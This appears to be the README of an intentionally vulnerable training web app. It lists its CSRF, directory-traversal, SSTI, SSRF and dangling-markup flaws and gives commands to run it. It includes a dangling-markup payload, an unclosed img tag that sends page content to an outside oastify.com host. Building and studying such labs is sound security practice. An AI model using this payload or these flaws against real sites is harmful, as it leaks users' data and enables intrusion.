## Vulnerabilities Present

###  CSRF
'Delete User' endpoint does not enforce CSRF tokens.

### Directory Traversal
`/files` endpoint is vulnerable to a directory traversal attack. 

### SSTI
`/dev` is vulnerable to an SSTI attack because it reflects a user-controlled value.

### Dangling Markup Injection
```bash
# Posting this comment will lead to a DMI
<img src="https://ao2ysiqollq72704d9i35s8qjhp8dy1n.oastify.com/
```

### SSRF
`/products` is vulnerable to SSRF. However, you need to bypass host verification. 

## Setps to Run
```bash
# Start the API server
node app/api/index.js

# Setup the database
python3 setup_db.py

# Run the app
python3 run.py
```
